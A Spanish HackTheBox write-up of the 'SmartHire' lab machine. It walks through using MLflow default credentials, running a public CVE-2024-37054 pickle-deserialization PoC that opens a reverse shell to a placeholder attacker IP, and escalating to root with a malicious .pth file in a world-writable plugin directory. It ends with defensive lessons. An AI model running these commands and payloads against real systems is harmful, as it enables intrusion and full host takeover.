---
title: "SmartHire"
date: 2026-07-13
categories: [HackTheBox, Medium]
tags: [linux, nginx, mlflow, CVE-2024-37054, pickle deserialization, RCE, default credentials, subdomain enumeration, self-registration, python pth, site addsitedir, sudo NOPASSWD, writable plugin directory]
image:
  path: /assets/img/HTB/SmartHire/banner.png
  alt: SmartHire writeup
protected: true
---


Cuenta auto-registrada en la aplicación SmartHire (una plataforma "AI-first" de contratación) más brute-force de vhosts revela `models.smarthire.htb` corriendo **MLflow v2.14.1** con las credenciales por defecto documentadas `admin:password`. MLflow v2.14.1 es vulnerable a **CVE-2024-37054** — deserialización insegura de pickle en la ruta de carga de modelos — que se explota subiendo un `python_model.pkl` con un payload de reverse shell basado en `__reduce__`; cuando la aplicación SmartHire realiza una predicción contra el modelo malicioso registrado, la deserialización del pickle se ejecuta como el usuario de la aplicación (`svcweb`), dando una reverse shell y acceso de usuario. Escalada de privilegios vía una entrada sudo que permite a `svcweb` ejecutar `mlflowctl.py` como root — el script itera cada subdirectorio bajo una carpeta `plugins/` escribible y pasa cada uno a `site.addsitedir()`, provocando que Python procese cualquier fichero `.pth` puesto ahí; un `.pth` con `import os; os.system("/bin/bash -p")` se `exec()`uta durante el arranque del intérprete y da un shell de root.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Medium              |
| SO         | Linux               |
| IP         | 10.129.245.215      |
| Fecha      | Julio 2026          |

## Herramientas Utilizadas

| Herramienta                     | Descripción                                                                            |
|---------------------------------|----------------------------------------------------------------------------------------|
| nmap                            | Escáner de puertos y fingerprinting de servicios                                       |
| gobuster (modo vhost)           | Enumeración de virtual hosts                                                           |
| Navegador                       | Registro de cuenta en SmartHire y login por credenciales por defecto en MLflow         |
| PoC pública de CVE-2024-37054   | Driver de terceros para la RCE por deserialización de pickle de MLflow                 |
| netcat (nc)                     | Listener para el reverse shell                                                         |
| echo + sudo                     | Depositar el fichero `.pth` y disparar el entry point vulnerable de Python con privilegios |

## Reconocimiento y Enumeración

El objetivo de esta fase fue mapear la superficie de ataque, identificar el stack de la aplicación, y localizar cualquier subdominio que pudiera contener el servicio objetivo real.

### Descubrimiento del Host

Comprobación de alcance y pista sobre el sistema operativo mediante ICMP:

```bash
ping -c 1 10.129.245.215
PING 10.129.245.215 (10.129.245.215) 56(84) bytes of data.
64 bytes from 10.129.245.215: icmp_seq=1 ttl=63 time=43.8 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al atravesar el salto de enrutamiento).

### Escaneo de Puertos

Barrido TCP completo primero:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.245.215 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Detección de versiones sobre los puertos abiertos:

```bash
sudo nmap -p22,80 -sCV 10.129.245.215 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
Service Info: OS: Linux
```

Dos puertos — SSH y HTTP. OpenSSH 8.9p1 está actualizado y es poco probable que sea un punto de entrada directo. El servidor HTTP devolvió un redirect a `smarthire.htb`, señal de virtual hosting basado en nombre. El dominio se añadió a `/etc/hosts`:

```bash
echo "10.129.245.215 smarthire.htb" | sudo tee -a /etc/hosts
```

### Aplicación Web — auto-registro en SmartHire

Navegando a `http://smarthire.htb/` cargó la portada de lo que se identificaba como SmartHire, una plataforma "AI-first" de contratación. La landing enlazaba a un formulario **Create account**:

![SmartHire Create your account form with username, company, and password fields](/assets/img/HTB/SmartHire/cap1.png)

Una cuenta auto-registrada es una primitiva barata de enumeración — te mete dentro de la superficie autenticada de la aplicación, que es donde suelen vivir los endpoints interesantes, y no cuesta nada intentarlo. La cuenta `monre` / `monre123` (con la compañía `monre`) se registró y la sesión resultante quedó autenticada.

La vista autenticada expuso una interfaz de gestión de candidatos con features tipo predicción ("puntúa un candidato", "empareja con una oferta") — consistente con el pitch comercial de plataforma de contratación con ML. Nada en la propia app dejó salir una vulnerabilidad obvia en el tiempo que le dediqué, pero la marca "AI-first" apuntaba a una pregunta obvia: **¿dónde vive el modelo?** Los modelos de ML rara vez residen en la misma aplicación web que los consume; suelen estar alojados en un servicio dedicado de tracking/registry al que la app llama en tiempo de inferencia. Ese servicio suele vivir en un subdominio.

### Enumeración de Subdominios

Brute-force de vhosts con la lista estándar de 110k entradas:

```bash
sudo gobuster vhost -u http://smarthire.htb \
   -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
   --append-domain
models.smarthire.htb  Status: 401 [Size: 137]
```

Un único hit no-wildcard — **`models`** — y el 401 es en sí mismo informativo: el subdominio existe, responde y exige autenticación. Eso es un servicio con control de acceso intencional, exactamente la forma de un model registry.

```bash
echo "10.129.245.215 models.smarthire.htb" | sudo tee -a /etc/hosts
```

### `models.smarthire.htb` — identificación de MLflow

Al navegar al subdominio se disparó un prompt de login modal sobre fondo oscuro:

![Modal login prompt with Username, Password, Remember me toggle, Cancel and Login buttons over a dark background](/assets/img/HTB/SmartHire/cap2.png)

El modal está generado por el navegador (HTTP Basic Auth), no renderizado por la aplicación. Es la primera pista sobre el servicio — las apps web modernas casi nunca usan Basic; es la tarjeta de visita del tooling de infraestructura que prioriza simplicidad sobre UX (Prometheus, Jenkins con el plugin de auth más simple, el tracking server de MLflow). El ángulo **AI-first hiring** más un subdominio `models` más HTTP Basic apuntaba con fuerza a **MLflow**.

El tracking server de MLflow está documentado para aceptar `admin:password` como conjunto de credenciales por defecto. Probándolo directamente entró y renderizó la UI familiar de MLflow:

![MLflow header showing version 2.14.1 with Experiments and Models tabs, and an Experiments panel with a Default entry](/assets/img/HTB/SmartHire/cap3.png)

**MLflow v2.14.1**. Esta versión cae dentro del rango vulnerable de **CVE-2024-37054** — una deserialización insegura crítica (CVSS 8.8) en la ruta de carga de modelos que da RCE contra cualquier cliente que haga predicción contra un modelo diseñado por el atacante.

## Explotación — CVE-2024-37054 (RCE por Deserialización de Pickle en MLflow)

### Entendiendo la Vulnerabilidad

El formato de artefacto de modelo de MLflow es `python_model.pkl` — un objeto Python serializado con pickle que MLflow carga con `cloudpickle.load()` (un wrapper de `pickle.load`) cuando se solicita un modelo para inferencia. La deserialización de pickle es una primitiva documentada de ejecución de código por diseño: `pickle.load()` llama a `__reduce__` sobre objetos custom, y `__reduce__` puede devolver una tupla `(callable, args)` donde el callable es cualquier cosa importable en ese momento — `os.system`, `subprocess.Popen`, `builtins.exec`. Esto no es una vulnerabilidad en el sentido de "comportamiento no intencionado"; es una propiedad bien documentada de pickle contra la que la documentación de Python advierte explícitamente cuando se usa con datos no confiables.

La vulnerabilidad en MLflow ≤2.14.x es que la ruta de carga de modelos en `mlflow/pyfunc/model.py` — concretamente `_load_pyfunc` — deserializa `python_model.pkl` sin ninguna validación ni sandboxing, sobre el supuesto de confianza de que el model registry solo contiene artefactos benignos subidos por usuarios internos de confianza. **Cualquier usuario autenticado con permisos de escritura sobre el registry puede subir un modelo envenenado**, y cualquier llamada de inferencia posterior por parte de la aplicación contra ese modelo dispara el payload en el proceso de la aplicación.

La topología del exploit tiene tres participantes:

1. **MLflow** (`models.smarthire.htb`) — aloja los artefactos de modelo. El atacante necesita credenciales aquí para registrar un modelo y subir el pickle malicioso. `admin:password` se las proporciona.
2. **La aplicación** (`smarthire.htb`) — es la que realmente llama a MLflow en tiempo de predicción y deserializa el pickle. El atacante necesita credenciales aquí para disparar una predicción contra el modelo malicioso. `monre:monre123` (la cuenta auto-registrada) se las proporciona.
3. **El listener** — recibe el callback disparado por el payload del pickle. Corre en la máquina atacante.

El proceso comprometido está en el **lado de la aplicación**, no en MLflow mismo — porque es ahí donde se carga el pickle. Este detalle importa: el reverse shell llega como el usuario de servicio de la app (`svcweb`), no como ninguna cuenta del lado de MLflow.

### Ejecución de la PoC pública

La PoC pública en [`github.com/ben-slates/CVE-2024-37054`](https://github.com/ben-slates/CVE-2024-37054) implementa el flujo de seis pasos con toda la fontanería de argumentos ya montada — autenticarse contra la app, generar un payload pickle basado en `__reduce__`, registrar un modelo en MLflow, subir el pickle malicioso como artefacto del modelo, y llamar al endpoint de predicción de la app apuntando al modelo recién registrado.

Se lanzó un listener de netcat en la máquina atacante:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

Y se invocó el exploit con ambos conjuntos de credenciales:

```bash
python3 poc.py http://smarthire.htb/ http://models.smarthire.htb/ <ATTACKER_IP> 4444 \
    --mlflow-creds admin:password \
    --app-username monre \
    --app-password monre123

[*] Target: http://smarthire.htb
[*] MLflow: http://models.smarthire.htb
[*] Listener: <ATTACKER_IP>:4444
[*] Payload: Python reverse shell

[*] Step 1/6: Authentication
[*] Authenticating as monre...
[+] Authentication successful
[*] Step 2/6: Generating payload
[+] Payload size: 254 bytes
[*] Step 3/6: Registering model
[*] Uploading training data to register model...
[+] Model registered: monre-bed868370f3c-model (v1)
[*] Step 4/6: Retrieving run ID
[*] Searching for MLflow runs...
[+] Found run: 63899741968c472aa5f895d6c015c4a0
[*] Step 5/6: Uploading malicious pickle
[+] Payload uploaded successfully (254 bytes)
[*] Step 6/6: Triggering remote code execution
[*] Triggering deserialization via prediction...
[+] Request timed out - shell should be connected!
```

El mensaje "Request timed out" en el último paso es esperado — la petición de predicción no completa normalmente porque el reverse shell mantiene bloqueado el thread de respuesta. El listener recibió el callback:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.245.215 44120
svcweb@smarthire:/var/www/smarthire.htb$
```

Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable. `svcweb` es la cuenta de servicio que ejecuta la aplicación web SmartHire y — atípicamente para una cadena de esta longitud — también es la cuenta que posee `user.txt`:

```bash
svcweb@smarthire:~$ cat /home/svcweb/user.txt
```

No fue necesaria una fase de movimiento lateral; el usuario del foothold es el poseedor de la flag de usuario.

## Escalada de Privilegios — `svcweb` → `root`

### Descubriendo la entrada sudo

La enumeración estándar sobre `svcweb` sacó a la luz una única entrada sudo:

```bash
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

El wildcard `*` del final es el detalle engañoso — sugiere un abuso al estilo GTFOBins con inyección de argumentos, pero el mecanismo real aquí es distinto. El wildcard solo permite a `svcweb` pasar *cualquier* argumento a `mlflowctl.py`. Sea cual sea el comportamiento explotable, está dentro del propio script.

### Analizando `mlflowctl.py`

```bash
cat /opt/tools/mlflow_ctl/mlflowctl.py
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": main()
```

La funcionalidad anunciada del script es administrativa — comprobar el estado de MLflow, hacer backup de modelos, reiniciar el servicio. Las tres acciones expuestas llaman a funciones de plugins en `/opt/tools/mlflow_ctl/plugins/`, y ninguna de ellas toma argumentos controlados por el usuario. No hay inyección de comandos obvia a través de `argv[1]`.

El comportamiento explotable está en el bucle justo al principio:

```python
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

Este bucle itera cada subdirectorio de `PLUGINS_DIR` (`/opt/tools/mlflow_ctl/plugins/`) y entrega cada uno a **`site.addsitedir()`**. La intención es legítima — hacer que cada directorio de plugin sea importable para que el `import mlflow_actions, backup_models` al principio de `main()` funcione. Pero `site.addsitedir()` hace más que solo añadir el directorio a `sys.path`.

### Ejecución de ficheros `.pth` de Python vía `site.addsitedir()`

`site.addsitedir()` está documentado para **procesar cada fichero `.pth`** en el directorio destino como parte de su inicialización. Los ficheros `.pth` son un mecanismo de Python pensado para casos de uso legítimos (instalaciones en modo dev vía `pip install -e`, entradas de sys.path gestionadas por la distribución), pero sus reglas de procesamiento son más permisivas de lo que la mayoría de desarrolladores de Python creen:

- Cada línea se lee.
- Las líneas vacías y las que empiezan por `#` se ignoran.
- Las líneas que empiezan por `import` (con espacio o tab detrás) se **`exec()`utan como código Python**.
- Las demás líneas no vacías se tratan como directorios a añadir a `sys.path`.

La regla relevante es la tercera — cualquier línea que empiece por `import` ejecuta código Python arbitrario. Este es el comportamiento documentado del módulo `site`; existe para soportar hooks al estilo setup.py que necesitan configurar `sys.path` antes de que corra código. En un contexto ofensivo, convierte cualquier directorio escribible procesado por `addsitedir()` en una primitiva de ejecución de código arbitrario.

Para `mlflowctl.py` corriendo bajo sudo como root: si algún subdirectorio de `plugins/` es escribible por `svcweb`, dejar caer un fichero `.pth` ahí con una línea que empiece por `import` hace que ese código se ejecute como root cuando el script arranca.

Una comprobación rápida del directorio de plugins reveló la ruta escribible:

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
drwxr-xr-x 4 root   root   4096 Jul 13 22:15 .
drwxr-xr-x 3 root   root   4096 Jul 13 22:15 ..
drwxr-xr-x 2 root   root   4096 Jul 13 22:15 core
drwxrwxrwx 2 svcweb svcweb 4096 Jul 13 22:15 dev
```

`plugins/dev/` es world-writable (modo 0777). La convención de nombrar directorios `dev` es una trampa habitual — los directorios "dev" tienden a acumular permisos más laxos que los de producción que tienen al lado, y el desajuste sobrevive hasta producción.

### Obteniendo root

El payload es un fichero `.pth` de una sola línea. Se usa `/bin/bash -p` en vez de `/bin/bash` a secas — el flag `-p` le dice a bash que preserve el EUID efectivo aunque EUID y RUID difieran, lo cual importa porque los subprocesos que Python lanza heredan ambos UIDs pero bash puede bajar el EUID a RUID al arrancar salvo que se establezca `-p`:

```bash
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Y luego el disparo con privilegios — `mlflowctl.py` ejecutado con `sudo` con cualquier acción:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
root@smarthire:/opt/tools/mlflow_ctl#
```

El intérprete procesó `exploit.pth` durante `site.addsitedir()`, `exec()`utó la línea `import os; os.system("/bin/bash -p")`, y cayó en una shell de root antes incluso de que el `main()` de `mlflowctl.py` se ejecutara. `whoami` confirmó:

```bash
root@smarthire:/opt/tools/mlflow_ctl# whoami
root
root@smarthire:/opt/tools/mlflow_ctl# cat /root/root.txt
```

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Lecciones Clave

- **Los model registries son primitivas de ejecución de código, no almacenamiento pasivo.** MLflow, Weights & Biases, DVC y cualquier plataforma de ML-lifecycle que soporte modelos serializables en Python los almacena por defecto como pickle. Cualquier acceso de escritura autenticado al registry es ejecución de código arbitrario autenticada contra cada consumidor de ese registry. La mitigación arquitectónica correcta son artefactos de modelo firmados con verificación de firma en runtime (p.ej. Sigstore, o la feature de model signature de MLflow cuando se aplica estrictamente); la mitigación operativa correcta es tratar las credenciales del registry como secretos de producción, no como conveniencias del equipo de desarrollo.
- **Las arquitecturas multi-servicio componen fronteras de confianza.** El diseño de SmartHire — model registry dedicado en un subdominio, la app principal llama al exterior para hacer predicciones — es un buen patrón defensivo que reduce la exposición del servidor de la app. Pero el patrón exige que la app *confíe* en el registry, y cualquier código que se reduzca a "carga lo que sea que el registry nos entregue" colapsa la frontera en una dirección. El registry se convierte en superficie de ataque contra la app, no solo contra sí mismo. Un compromiso en cualquier punto de la cadena de suministro de modelos se convierte en un compromiso del servidor de inferencia.
- **Las credenciales por defecto documentadas en servicios de infraestructura siguen siendo credenciales por defecto.** MLflow se distribuye con `admin:password` como default del tracking server; la documentación dice explícitamente que se cambie; la realidad es que muchos despliegues no lo hacen. Cuando un servicio con sabor a appliance (registry, monitorización, message broker, artifact store) expone un prompt de Basic Auth, la credencial por defecto del fabricante es lo primero que hay que probar — antes de ataques de diccionario, antes de enumeración de usuarios, antes de cualquier research de exploitation.
- **Los flujos de auto-registro son un multiplicador de foothold.** SmartHire permite a cualquier visitante crear una cuenta sin aprobación, que fue una pieza necesaria de la cadena de explotación — las credenciales del lado de la app necesarias para disparar la predicción que hizo saltar el pickle. El self-service registration es una feature legítima para productos orientados al usuario final, pero cualquier aplicación que acepte cuentas auto-registradas debería asumir que esas cuentas se usarán de forma adversarial tarde o temprano. Defensivamente: la superficie de ataque autenticada no debería ser menor que la superficie de ataque no autenticada en el modelo de amenaza.
- **Los ficheros `.pth` son una primitiva estándar de Python para ejecutar código.** `site.addsitedir()` y sus primas ejecutan cualquier línea en un fichero `.pth` que empiece por `import`. Es una feature documentada del módulo `site`, usada legítimamente por instalaciones editables y hooks de frameworks, pero sorprende habitualmente a los desarrolladores de Python que escriben scripts que llaman a `addsitedir()` sobre directorios influenciados por el usuario. El checklist de auditoría para privesc en Python: busca `site.addsitedir`, `sys.path.insert`, `importlib.import_module` con nombres de módulo influenciados por el atacante, y cualquier código que añada al import path directorios escribibles por el atacante.
- **El wildcard en una entrada sudo no siempre es el vector.** `(root) NOPASSWD: /usr/bin/python3.10 /path/to/script.py *` parece un objetivo al estilo GTFOBins — prueba `-c` para código arbitrario, prueba `<config>` para hijack de imports, prueba variables de entorno. En esta caja el wildcard es solo lo que permite pasar `status` (o cualquier otro subcomando); la vulnerabilidad real está en lo que el propio script hace en tiempo de import. Las entradas de sudo que apuntan a scripts de Python deberían auditarse leyendo el script, no tirando reflexivamente de GTFOBins.
- **Los directorios "dev" son una bomba de relojería de permisos.** `plugins/dev/` en modo 0777 al lado de `plugins/core/` en modo 0755 es exactamente el patrón que sobrevive a los pipelines de despliegue — el directorio dev empezó como espacio de scratch en el portátil de alguien, se incluyó en el rol de ansible porque "necesitamos poder escribir ahí durante el desarrollo", y nunca vio sus permisos apretados antes de producción. Cualquier directorio llamado `dev`, `tmp`, `staging`, `temp`, `scratch` o `test` dentro de una instalación de producción debería asumirse con permisos más laxos que los directorios de producción vecinos.
- **`bash -p` vs `bash` importa cuando se lanza una shell desde contextos suid/sudo.** El flag `-p` preserva el EUID efectivo incluso cuando EUID y RUID difieren. El comportamiento por defecto de bash es bajar EUID a RUID al arrancar como medida defensiva contra herencia setuid no intencionada; ese comportamiento normalmente es bienvenido pero sabotea exactamente el escenario que un atacante intenta construir tras una privesc por Python. `/bin/bash -p` en el payload es el pequeño detalle operativo que marca la diferencia entre "shell de root que rápidamente deja de ser root" y "shell de root que se mantiene root".
